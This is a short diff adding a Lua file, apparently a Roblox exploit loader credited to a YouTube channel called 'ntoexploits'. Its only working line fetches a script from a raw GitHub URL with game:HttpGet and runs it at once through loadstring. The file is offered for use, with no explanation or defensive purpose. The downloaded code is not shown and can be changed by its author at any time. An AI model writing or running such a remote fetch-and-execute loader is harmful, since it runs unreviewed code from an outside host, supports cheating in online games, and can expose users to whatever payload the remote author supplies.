@@ -1,0 +1,6 @@
+--[[
+            
+     youtube.com/c/ntoexploits
+
+]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IRSILVER/nto/main/dingus"))()
